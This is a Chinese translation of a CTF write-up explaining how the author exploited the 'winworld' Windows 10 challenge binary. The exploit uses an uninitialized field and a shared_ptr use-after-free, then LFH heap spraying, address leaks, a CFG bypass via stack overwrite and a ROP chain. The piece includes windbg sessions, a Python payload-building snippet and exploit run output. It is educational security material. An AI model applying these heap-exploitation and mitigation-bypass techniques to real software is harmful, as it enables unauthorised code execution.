# 【技术分享】在Windows10中利用一个误用的C++共享指针

阅读量 **131325**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-02-09 13:55:38

 **x**

##### 译文声明

本文是翻译文章，文章来源：blog.scrt.ch

原文地址：<https://blog.scrt.ch/2017/01/27/exploiting-a-misused-c-shared-pointer-on-windows-10/>

译文仅供参考，具体内容表达以及含义原文为准。

****

翻译：[myswsun](http://bobao.360.cn/member/contribute?uid=2775084127)

预估稿费：200RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

**0x00 前言**

在本文中，我描述了我的“winworld”挑战的一个详细的解决方案，这个挑战来自Insomni’hack CTF Teaser
2017。Winworld是一个使用C++11编写的x64的Windows二进制文件，并且包含了大部分Windows
10内置的保护措施，特别是AppContainer([
**AppJailLauncher**](https://github.com/trailofbits/AppJailLauncher)
)、执行流保护和最新的缓解策略。

这些能使用Process Hacker快速的验证（也要注意保留的2TB的CFGBitmap）：

这个任务运行在Windows Server 2016上面，挑战的行为与Windows
10一致，甚至使用了相同的库。这个挑战和描述能在[这里](https://github.com/Insomnihack/Teaser-2017/tree/master/winworld)找到。

**  
**

**0x01 二进制的逻辑**

我们的今年的主题是“机器的风险”；winworld是最新的Westworls
TV秀，并实现了一个“narrator”接口，你能够创建机器人和人类，配置他们的行为，并且在地图上面移动他们。

这个narrator操作Person对象，这个对象是“hosts”（robots）和“guests”（humans）的共享类。每个类型存储在独立的列表中。

每个Person对象有下面的属性：

这个narrator暴露了下面的命令：

    
    
    --[ Welcome to Winworld, park no 1209 ]--    narrator [day 1]$ help
    Available commands:
     - new <type> <sex> <name>
     - clone <id> <new_name>
     - list <hosts|guests>
     - info <id>
     - update <id> <attribute> <value>
     - friend <add|remove> <id 1> <id 2>
     - sentence <add|remove> <id> <sentence>
     - map
     - move <id> {<l|r|u|d>+}
     - random_move
     - next_day
     - help
     - prompt <show|hide>
     - quit
    narrator [day 1]$

在调用move或者random_move时行为发生，2个人相遇了。这个onEncounter方法指针被调用，他们能交互。只有攻击实际对其他Person对象有影响：如果攻击成功了，其他对象可能损坏或者死亡。Robots会永久死亡但是不能杀死humans。Humans只能活一次并且能杀死其他humans。next_day功能能复活robots的生命和恢复每个人的健康，但是如果对象是一个死人，将会被移除出列表。

People使用马尔可夫链的自动的方式交流，这种方式使用Westworld脚本初始化和添加句子，这个可能会发生有趣的对话。许多句子不能一直有效，因为有漏洞存在，我在描述中指定了它，以节省一些逆向的时间（已经有大量的C
++逆向了）。

**  
**

**0x02 弱点1：在Person中复制构造函数未初始化属性**

在narrator初始化期间，map随机生成并且一个特定的点被选作“maze
center”，当某些特定条件达到时，机器人将转变为人类。这个条件是当前移动的Person必须是HOST，设置了is_conscious，并且必须有一个人类（GUEST）在maze
center。

第一件事是找到这个点。所有的随机数据能使用rand()获得，并且这个种子使用经典的srand(time(NULL))来初始化。因此这个种子能通过几次尝试来确定。一旦同步了服务器的时钟，在利用中简单的重放初始化算法能允许找到用来生成maze
center的rand()的值。编写一个简单的路径查找算法来使每个人都到这个位置。

机器人通过Person::Person构造函数中的is_conscious=false来初始化。然而这个Person::Person的拷贝构造函数被narrator的clone函数使用了，但是忘记了初始化。这个值将是未初始化的，并可以使用堆上面已有的内容。结果是克隆一个机器人足以使的is_conscious!=0，但是我们需要确保它是。

有时新克隆的机器人将在LFH中，有时不是。最好是通过克隆0x10减去当前的Person对象数（6）来确保总是在LFH中。让我们克隆6+1次并在windbg中检验：

    
    
    0:004> ? winworld!Person::Person
    Matched: 00007ff7`9b9ee700 winworld!Person::Person (<no parameter info>)
    Matched: 00007ff7`9b9ee880 winworld!Person::Person (<no parameter info>)
    Ambiguous symbol error at 'winworld!Person::Person'
    0:004> bp 00007ff7`9b9ee880 "r rcx ; g" ; bp winworld!Person::printInfos ; g
    rcx=0000024a826a3850
    rcx=0000024a826800c0rcx=0000024a82674130
    rcx=0000024a82674310
    rcx=0000024a82673a50
    rcx=0000024a82673910
    rcx=0000024a82673d70Breakpoint 1 hit
    winworld!Person::printInfos:
    00007ff7`9b9f0890 4c8bdc mov r11,rsp
    0:000> r rcx
    rcx=0000024a82673d700:000> !heap -x 0000024a826800c0Entry User Heap Segment Size PrevSize Unused Flags
    -------------------------------------------------------------------------------------------------------------    0000024a826800b0 0000024a826800c0 0000024a82610000 0000024a82610000 a0 120 10 busy 
    0:000> !heap -x 0000024a82673d70Entry User Heap Segment Size PrevSize Unused Flags
    -------------------------------------------------------------------------------------------------------------    0000024a82673d60 0000024a82673d70 0000024a82610000 0000024a828dec10 a0 - 10 LFH;busy

在这里我们能看到头2个不在LFH中，其他的都在。

LFH分配是随机的，增加了一些挑战。然而这些分配使用大小为0x100的数组随机化，其位置以模数0x100递增，这意味着如果我们喷射正确大小的0x100个元素，我们将回到相同的位置，从而获得确定性行为。我们甚至不需要保证内存块，因此我们能简单的使用0x90大小（和Person一样）的命令字符串来喷射，它总是为clone操作初始化is_conscious属性。

现在我们的机器人变成了人类，并且麻烦再次开始！

注意：似乎Visual Studio
2015默认开启了/sdl编译标记，这将添加memset函数来将分配的Person对象填充为0，因此变得不可利用。我禁用了它，但为了公平起见，我开启了不是默认的CFG！

**  
**

**0x03 弱点2：误用了std::shared_ptr**

共享指针是一个对象指针的简单封装。它特别添加了引用计数，在shared_ptr关联了新的变量时会增加计数，当释放了变量会减少计数。当引用计数变为0时，引用对象将不会存在，因此它自动释放它。针对UAF漏洞这个特别有效。

在这个挑战中，当机器人变成人类，它还保留在robtots列表中（但是它的is_enable字段变为false，因此不能再作为机器人了），并且被插入到humans列表中：

这是非常错误的，因为不是增加对象的shared_str的引用计数，我们创建了一个新的shared_str只想一个相同的对象：

当任意两个shared_ptr的引用计数降为0，这个对象被释放，并且因为其他shared_ptr还存活着，我们还是可以利用UAF漏洞！为了做到这个，我们能杀掉human-robot来使用另一个人类。我们也不得不移除他所有的朋友，否则引用计数不会为0。然后当它从guests向量中移除了指针时，使用next_day方法释放它：

现在得到RIP是简单的，因为对象拥有一个方法指针：使用一个假对象来喷射长度0x90的0x100个字符串，这个对象是std::string能包含空字节，然后将死掉的human-robot右移，他将再次遇到他的杀手，并触发覆盖onEncounter的方法指针：

    
    
    def craft_person(func_ptr, leak_addr, size):
     payload = struct.pack("<Q", func_ptr) # func pointer
     payload += "x00" * 24 # friends std::vector
     payload += "x00" * 24 # sentences std::vector
    
     # std::string name
     payload += struct.pack("<Q", leak_addr)
     payload += "JUNKJUNK"
     payload += struct.pack("<Q", size) # size
     payload += struct.pack("<Q", size) # max_size
    
     payload += struct.pack("<I", 1) # type = GUEST
     payload += struct.pack("<I", 1) # sex
     payload += "x01" # is_alive
     payload += "x01" # is_conscious
     payload += "x01" # is_enabled
     [...]
    
    payload = craft_person(func_ptr=0x4242424242424242, leak_addr=0, size=0)for i in range(0x100):
        sendline(s, payload)
    sendline(s, "move h7 lr")

结果：

    
    
    0:004> g
    (1a00.c68): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    ntdll!LdrpValidateUserCallTarget+0xe:
    00007ffa`89b164ae 488b14c2 mov rdx,qword ptr [rdx+rax*8] ds:010986ff`08d30908=????????????????
    0:000> ? rax << 9
    Evaluate expression: 4774451407313060352 = 42424242`42424200

CFG将使问题变得复杂一点，但是在那之前我们需要来泄漏地址对抗ASLR。

**  
**

**0x04 泄漏二进制基地址**

在前一个代码样本中我们制作了一个大小为0的std:string来阻止打印名字时崩溃。用有效值来替换指针和大小将在该地址打印大小字节，因此我们使用任意原始读写。现在我们打印了什么?除了_KUSER_SHARED_DATA的地址0x7ffe0000，其他都有ASLR，但是在Windows
10中它不能容纳任何指针。

代替使用字符串来利用UAF，我们必须使用相同LFH大小（0xa0）的另一个对象来替换Person对象。我们没有其他的，但是我们能增加vector的大小来代替。

使用std::vector<std::shared_ptr<Person>> friends来循环测试，我们使用7-9 friends能得到一些东西：

    
    
    0:004> g
    Breakpoint 0 hit
    winworld!Person::printInfos:
    00007ff7`9b9f0890 4c8bdc mov r11,rsp
    0:000> dq rcx
    000001cf`94daea60 00007ff7`9b9ef700 000001cf`94d949b0000001cf`94daea70 000001cf`94d94a20 000001cf`94d94a40
    000001cf`94daea80 000001cf`94dac6c0 000001cf`94dac760
    000001cf`94daea90 000001cf`94dac780 00736572`6f6c6f44
    000001cf`94daeaa0 61742074`73657567 00000000`00000007
    000001cf`94daeab0 00000000`0000000f 00000002`00000000
    000001cf`94daeac0 00000000`20010001 00000000`00000000
    000001cf`94daead0 0000003d`00000020 0000000a`00000004
    0:000> !heap -x 000001cf`94d949b0Entry User Heap Segment Size PrevSize Unused Flags
    -------------------------------------------------------------------------------------------------------------    000001cf94d949a0 000001cf94d949b0 000001cf94d30000 000001cf94dafb50 a0 - 10 LFH;busy 
    0:000> dq 000001cf`94d949b0000001cf`94d949b0 000001cf`94dfb410 000001cf`94d90ce0
    000001cf`94d949c0 000001cf`94dac580 000001cf`94d90800
    000001cf`94d949d0 000001cf`94d98f90 000001cf`94d911c0
    000001cf`94d949e0 000001cf`94d99030 000001cf`94d912e0 # string pointer000001cf`94d949f0 000001cf`94db4cf0 000001cf`94d91180 # string size000001cf`94d94a00 000001cf`94db7e60 000001cf`94d912a0
    000001cf`94d94a10 000001cf`94e97c70 000001cf`94d91300
    000001cf`94d94a20 7320756f`590a2e73 73696874`20776f68
    0:000> dps poi(000001cf`94d949b0+8+0n24*2) L3000001cf`94d912e0 00007ff7`9b9f7158 winworld!std::_Ref_count<Person>::`vftable'000001cf`94d912e8 00000001`00000005
    000001cf`94d912f0 000001cf`94d99030

这个vector现在属于和Person对象相同的LFH。如果我们喷射0xf0字符串接着0x10 7-friends
vectors，我们能够泄漏指针：在winworld中的一个虚表地址和堆。我们应该能用0xff字符串来做到这个，然后是一个friends
vectors，但是有一些分配有时会发生，我还没调试出什么引起的。

尽管我们不能控制大小，它是巨大的，因此二进制不可避免的将崩溃！好消息是Windows上的堆和栈的随机只在每次启动时发生一次。每个进程都随机好了。这是不好的，但是因为二进制文件自动重启不是个问题，因此我们已经泄露了模块基地址，并且我们能够在子过程中复用它。

注意：当你开发一个Windows利用时，不要把二进制文件放在linux主机共享中，这会导致每次执行都随机化！

**  
**

**0x05 绕过CFG**

CFG是微软的控制流完整性方案，它基于任何非直接调用必须指向函数开头的简单思想。在非直接调用之前会有__guard_check_icall_fptr插入：

在Windows 10中这将调用ntdll!LdrpValidateUserCallTarget来检验指针是否是一个可靠的函数开头，如果不是则终止。

CFG的优势是能强制中断一个合法的程序（因此没有原因不使用它）。然而CFG有3个常见的缺陷：

1\. 与验证函数参数和返回值的类型的CFI机制相比， 被允许的目标的集合还是太大。

2\. 它不能保护栈，因为返回地址不是函数开头。微软将使用RFG来修复这个并且将来Intel处理器也支持，但是还是不够强。

3\. 如果加载了一个没有使用CFG编译的模块，该模块的所有的地址都是被允许的。JIT可能有问题。（这里的二进制和所有模块都支持CFG和没有JIT）

当我写这个文章的时候，一篇[ **绕过CFG的博文**](https://improsec.com/blog/bypassing-control-flow-guard-in-windows-10)
就已经发布了，即利用kernel32！RtlCaptureContext（缺陷1）。j00ru是唯一一个解决这个任务的人，使用它来泄漏栈，但是我没有使用这个，而是选择了手动泄漏/写栈（缺陷2）。

我们已经使用了std::string
name属性来实现任意读取，现在我们也能够使用它来实现任意写！唯一需要的是将字符串替换为不比当前std::string对象最大大小更多的字节。这非常酷，然而目前为止我们还不知道栈（或者堆）在哪里，并且每次运行程序的库都会随机。我们后面会回到这。首先我们也想泄漏其他库的地址。

**  
**

**0x06 泄漏其他库**

使用二进制基址和0x100个persons字符串的喷射，我们足够泄漏任意的内存地址。
我们能保留vectors为空字符串，来阻止调用Person::printInfos时崩溃。

现在我们已经有了二进制的基址，并且知道下次启动才会改变，泄漏其他库是个尝试：我们能转储IAT的入口。我的利用充分利用了ucrtbase.dll和ntdll.dll（在CFG中总是存在IAT），能通过构造一个std::string指向下面地址来完成泄漏：

    
    
    0:000> dps winworld+162e8 L1
    00007ff7`9b9f62e8 00007ffa`86d42360 ucrtbase!strtol
    0:000> dps winworld+164c0 L2
    00007ff7`9b9f64c0 00007ffa`89b164a0 ntdll!LdrpValidateUserCallTarget
    00007ff7`9b9f64c8 00007ffa`89b164f0 ntdll!LdrpDispatchUserCallTarget

重复泄漏，我们能用gets()的地址来覆盖onEncounter的方法指针，一旦我们定位了ucrtbase.dll的基址。这当然是因为这个任务特殊的上下文，其标准输入输出流重定向到了客户端套接字上。这将触发gets(this_object)堆溢出，我们能使用来覆盖名字字符串的属性。

**  
**

**0x07 泄漏栈**

在哪找栈指针？我们能从ntdll找到PEB的指针，然而在x64中PEB结构不包含指向TEB的指针。

一个最近的[ **j00ru的博文**](http://j00ru.vexillium.org/?p=2835)
描述了一个有趣的事实：尽管没有好的原因在堆上面存储栈指针，但是在进程初始化期间可能会有一些剩余的堆栈数据被无意复制到堆中。

他的博文在x86上描述了它，让我们在x64上面的堆中找下隐藏的栈指针：

    
    
    0:001> !address
    [...]
            BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage
    --------------------------------------------------------------------------------------------------------------------------    [...]        3b`b6cfb000       3b`b6d00000        0`00005000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Stack      [~0; 2524.1738]
    [...]
    0:001> !heap
     Heap Address NT/Segment Heap 17c262d0000 NT Heap
     17c26120000 NT Heap
    0:001> !address 17c262d0000 Usage: Heap
    Base Address: 0000017c`262d0000End Address: 0000017c`26332000[...]
    0:001> .for (r $t0 = 17c`262d0000; @$t0 < 17c`26332000; r $t0 = @$t0 + 8) { .if (poi(@$t0) > 3b`b6cfb000 & poi(@$t0) < 3b`b6d00000) { dps $t0 L1 } }
    0000017c`262d2d90 0000003b`b6cff174
    0000017c`262deb20 0000003b`b6cffbd8
    0000017c`262deb30 0000003b`b6cffbc8
    0000017c`262deb80 0000003b`b6cffc30
    0000017c`2632cf80 0000003b`b6cff5e0
    0000017c`2632cfc0 0000003b`b6cff5e0
    0000017c`2632d000 0000003b`b6cff5e0
    0000017c`2632d1a0 0000003b`b6cff5e0
    0000017c`2632d2c0 0000003b`b6cff5e0
    0000017c`2632d4e0 0000003b`b6cff5e0
    0000017c`2632d600 0000003b`b6cff5e0
    0000017c`2632d660 0000003b`b6cff5e0
    0000017c`2632d6e0 0000003b`b6cff5e0
    0000017c`2632d700 0000003b`b6cff5e0
    0:000> dps winworld+1fbd0 L3
    00007ff7`9b9ffbd0 0000017c`2632ca8000007ff7`9b9ffbd8 0000017c`262da050
    00007ff7`9b9ffbe0 0000017c`2632cf20

好的！我们确实在默认堆上面找到了栈指针，并且我们能从winworld基址来泄漏堆中静态偏移的地址。

现在我们能浏览堆页，并且试图找到这些栈地址。在我的利用中为了简单，我使用了一个简单启发的方式来找到QWORDS在堆下面，但也高于100000000，交互式询问哪个可以作为栈泄漏。这明显可以改进。

**  
**

**0x08 缓解措施和ROP**

现在我们已经有任意写了并且能覆盖栈上面的RIP地址，剩下的就是构建ROP了。几个想法如下：

VirtualProtect，然后shellcode

加载SMB上面的库

执行一个shell命令（WinExec等）

完整的ROP来读取标记

正如早前提到的，二进制有一些最新的[缓解措施](https://msdn.microsoft.com/en-us/library/windows/desktop/hh769088\(v=vs.85\).aspx)，在我们的上下文中是相关联的：

ProcessDynamicCodePolicy：阻止插入新的可执行内存，VirtualProtect将失败

ProcessSignaturePolicy：库必须被签名，组织了LoadLibrary

ProcessImageLoadPolicy：库不能从远程位置加载，组织了加载SMB上的库

最后两个选项依然可以用。我也想在父进程AppJailLauncher进程中添加一个使用PROC_THREAD_ATTRIBUTE_CHILD_PROCESS_POLICY的UpdateProcThreadAttribute的调用，将阻止winworld创建新进程，但是因为是一个控制台程序，winworld也会带起一个conhost.exe进程。使用这个缓解措施能阻止conhost.exe的创建，并且因此程序不能运行。

我的解决方案在ROP中直接读取。因为我不想陷入CreateFile和Windows句柄的麻烦中，我代替使用了ucrtbase.dll中的_sopen_s/_read/puts/_flushall函数。

在ntdll中查找小配件，我们能找到x64调用规则的pop前四个寄存器的完美的小配件。小配件在CFG中是它自己，这非常惊喜，可以进入rop链了。

    
    
    0:000> u ntdll+96470 L5
    ntdll!LdrpHandleInvalidUserCallTarget+0x70:
    00007ffa`89b16470 5a pop rdx
    00007ffa`89b16471 59 pop rcx
    00007ffa`89b16472 4158 pop r8
    00007ffa`89b16474 4159 pop r9
    00007ffa`89b16476 c3 ret

最终整合到一起：

    
    
        Z:aweinsomnihack2017winworld>python sploit.py getflag remote
        [+] Discovering the PRNG seed...
         Clock not synced with server...
        [+] Resynced clock, delay of -21 seconds
        [+] Found the maze center: (38, 41)
        [+] Check the map for people positions
        [+] Make sure that LFH is enabled for bucket of sizeof(Person)
        6 / 6 ...
        [+] Spray 0x100 std::string to force future initialization of pwnrobot->is_conscious
        256 / 256 ...
        [+] Cloning host, with uninitialized memory this one should have is_conscious...
        [+] Removing current friends of pwnrobot...
        [+] Moving a guest to the maze center (37, 86) -> (38, 41)...
        [+] Moving our host to the maze center (38, 29) -> (38, 41)...
        [+] pwnrobot should now be a human... kill him!
        [+] Removing all pwnrobot's friends...
        7 / 7 ...
        [+] Decrement the refcount of pwnrobot's human share_ptr to 0 -> free it
        [+] Spray 0x100 std::string to trigger UAF
        256 / 256 ...
        [+] heap leak: 0x18a6eae8b40
        [+] Leaking stack ptr...
        [+] Dumping heap @ 0x18a6eae6b40...
        [+] Dumping heap @ 0x18a6eae7b40...
        [HEAP] 0x18a6eae7b40
         [00] - 0x18a6ea96c72
         [01] - 0x18a6ea9c550
         [02] - 0x18a6ea9e6e0
        Use which qword as stack leak?
        [+] Dumping heap @ 0x18a6eae8b40...
        [HEAP] 0x18a6eae8b40
         [00] - 0x3ab7faf120
         [01] - 0x3ab7faf4f0
         [02] - 0x18a6ea9c550
         [03] - 0x18a6eae84c0
         [04] - 0x18a6eae8560
         [05] - 0x18a6eae8760
        Use which qword as stack leak? 1
        [+] stack @ 0x3ab7faf4f0
        [+] Leaking stack content...
        [-] Haven't found saved RIP on the stack. Increment stack pointer...
        [-] Haven't found saved RIP on the stack. Increment stack pointer...
        [-] Haven't found saved RIP on the stack. Increment stack pointer...
        RIP at offset 0x8
        [+] Overwrite stack with ROPchain...
        [+] Trigger ROP chain...
        Better not forget to initialize a robot's memory!Flag: INS{I pwn, therefore I am!}[+] Exploit completed.

**  
**

**0x09 总结**

你能在[
**这里**](https://github.com/Insomnihack/Teaser-2017/blob/master/winworld/exploit/sploit.py)
找到完整的利用。

本文翻译自blog.scrt.ch [原文链接](https://blog.scrt.ch/2017/01/27/exploiting-a-misused-c-shared-pointer-on-windows-10/)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **root** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/85443](/post/id/85443)

安全客 - 有思想的安全新媒体

本文转载自: [blog.scrt.ch](https://blog.scrt.ch/2017/01/27/exploiting-a-misused-c-shared-pointer-on-windows-10/)

如若转载,请注明出处： <https://blog.scrt.ch/2017/01/27/exploiting-a-misused-c-shared-pointer-on-windows-10/>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p1.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) root

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

